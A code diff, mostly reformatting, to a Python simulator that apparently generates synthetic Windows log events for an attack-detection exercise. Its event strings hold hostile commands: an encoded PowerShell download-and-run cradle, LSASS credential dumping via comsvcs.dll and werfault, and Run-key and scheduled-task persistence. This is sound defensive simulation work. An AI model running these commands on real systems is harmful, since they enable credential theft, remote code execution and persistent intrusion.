@@ -29,17 +29,17 @@ APPS = ["chrome.exe", "outlook.exe", "excel.exe", "winword.exe", "teams.exe", "c
 @dataclass
 class Host:
     name: str
-    kind: str                  # workstation | server
+    kind: str  # workstation | server
     owner: str | None = None
-    critical: bool = False     # the domain controller
+    critical: bool = False  # the domain controller
 
 
 @dataclass
 class Step:
     t: int
     kind: str
-    host: str                  # where it runs
-    src: str | None = None     # where it comes from (lateral movement)
+    host: str  # where it runs
+    src: str | None = None  # where it comes from (lateral movement)
     account: str | None = None
     done: bool = False
 
@@ -51,7 +51,7 @@ class Scenario:
     hosts: list[Host]
     users: list[str]
     admins: list[str]
-    events: list[dict[str, Any]]           # benign, plus attack events as they happen
+    events: list[dict[str, Any]]  # benign, plus attack events as they happen
     plan: list[Step]
     initial_access: str
     exfil_kind: str
@@ -104,7 +104,9 @@ class Scenario:
             if self.initial_access == "phish":
                 enc = base64.b64encode(f"IEX (New-Object Net.WebClient).DownloadString('https://{self.rare_domain}/a')".encode("utf-16le")).decode()
                 if "initial" in self.stealthy:
-                    ev.append(_proc(t, st.host, st.account, "winword.exe", "rundll32.exe", rf"rundll32.exe C:\Users\{st.account}\AppData\Local\Temp\m.dll,Start"))
+                    ev.append(
+                        _proc(t, st.host, st.account, "winword.exe", "rundll32.exe", rf"rundll32.exe C:\Users\{st.account}\AppData\Local\Temp\m.dll,Start")
+                    )
                 else:
                     ev.append(_proc(t, st.host, st.account, "winword.exe", "powershell.exe", f"powershell.exe -nop -w hidden -enc {enc[:60]}"))
                 ev.append(_dns(t, st.host, self.rare_domain))
@@ -119,7 +121,16 @@ class Scenario:
             if "dump" in self.stealthy:
                 ev.append(_proc(t, st.host, st.account, "powershell.exe", "werfault.exe", r"werfault.exe -u -p 624 -ip 0 -s 1032"))
             else:
-                ev.append(_proc(t, st.host, st.account, "powershell.exe", "rundll32.exe", r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\d.bin full"))
+                ev.append(
+                    _proc(
+                        t,
+                        st.host,
+                        st.account,
+                        "powershell.exe",
+                        "rundll32.exe",
+                        r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\d.bin full",
+                    )
+                )
             self.stolen.add(st.account or "")
         elif st.kind == "lateral":
             ev.append(_auth(t, st.host, st.account, st.src, "success", "network"))
@@ -127,9 +138,20 @@ class Scenario:
             self.compromised.add(st.host)
         elif st.kind == "persist":
             if "persist" in self.stealthy:
-                ev.append(_proc(t, st.host, st.account, "cmd.exe", "reg.exe", r"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Sync /d C:\ProgramData\s.exe"))
+                ev.append(
+                    _proc(
+                        t,
+                        st.host,
+                        st.account,
+                        "cmd.exe",
+                        "reg.exe",
+                        r"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Sync /d C:\ProgramData\s.exe",
+                    )
+                )
             else:
-                ev.append(_proc(t, st.host, st.account, "cmd.exe", "schtasks.exe", r'schtasks /create /tn "OneDrive Sync" /tr C:\Users\Public\upd.exe /sc onlogon'))
+                ev.append(
+                    _proc(t, st.host, st.account, "cmd.exe", "schtasks.exe", r'schtasks /create /tn "OneDrive Sync" /tr C:\Users\Public\upd.exe /sc onlogon')
+                )
         elif st.kind == "exfil":
             if self.exfil_kind == "dns":
                 rng = np.random.default_rng(self.seed + t)
@@ -191,7 +213,7 @@ def make_scenario(seed: int, fam_name: str = "corp-small") -> Scenario:
     n_ws = int(rng.integers(fam["workstations"][0], fam["workstations"][1] + 1))
     n_adm = int(rng.integers(fam["admins"][0], fam["admins"][1] + 1))
     users = [f"u{i:02d}" for i in range(n_ws)]
-    admins = [f"adm-{u}" for u in users[:n_adm]]       # the first users are IT, with separate admin accounts
+    admins = [f"adm-{u}" for u in users[:n_adm]]  # the first users are IT, with separate admin accounts
     hosts = [Host(f"ws-{i:02d}", "workstation", users[i]) for i in range(n_ws)]
     hosts += [Host("dc-01", "server", critical=True), Host("file-01", "server"), Host("web-01", "server"), Host("backup-01", "server")]
     servers = [h.name for h in hosts if h.kind == "server"]
@@ -230,8 +252,16 @@ def make_scenario(seed: int, fam_name: str = "corp-small") -> Scenario:
                 ev.append(_auth(t, str(rng.choice(servers)), a, ws, "success", "network"))
         if rng.random() < fam["appdata_task_rate"]:
             ws = str(rng.choice(ws_names))
-            ev.append(_proc(t, ws, users[ws_names.index(ws)], "setup.exe", "schtasks.exe",
-                            r'schtasks /create /tn "UpdaterTaskUser" /tr C:\Users\Public\Updater\update.exe /sc hourly'))
+            ev.append(
+                _proc(
+                    t,
+                    ws,
+                    users[ws_names.index(ws)],
+                    "setup.exe",
+                    "schtasks.exe",
+                    r'schtasks /create /tn "UpdaterTaskUser" /tr C:\Users\Public\Updater\update.exe /sc hourly',
+                )
+            )
         for i, u in enumerate(users):
             if rng.random() < fam["macro_rate"]:
                 ev.append(_proc(t, ws_names[i], u, "excel.exe", "cmd.exe", "cmd.exe /c copy report.csv \\\\file-01\\reports"))
@@ -242,7 +272,16 @@ def make_scenario(seed: int, fam_name: str = "corp-small") -> Scenario:
                 ev.append(_net(t, ws_names[i], f"198.51.100.{int(rng.integers(2, 250))}", 443, int(rng.integers(50, 400)) * 1_000_000))
         if rng.random() < fam["it_task_rate"]:
             h = str(rng.choice([h.name for h in hosts]))
-            ev.append(_proc(t, h, "SYSTEM", "svchost.exe", "schtasks.exe", r'schtasks /create /tn "Defender Update" /tr "C:\Program Files\Defender\update.exe" /sc daily'))
+            ev.append(
+                _proc(
+                    t,
+                    h,
+                    "SYSTEM",
+                    "svchost.exe",
+                    "schtasks.exe",
+                    r'schtasks /create /tn "Defender Update" /tr "C:\Program Files\Defender\update.exe" /sc daily',
+                )
+            )
     bt = int(rng.integers(fam["backup_ticks"][0], fam["backup_ticks"][1] + 1))
     ev.append(_net(bt, "file-01", "backup-01", 445, 2_400_000_000))
     ev.append(_auth(bt, "file-01", "svc-backup", "backup-01", "success", "network"))
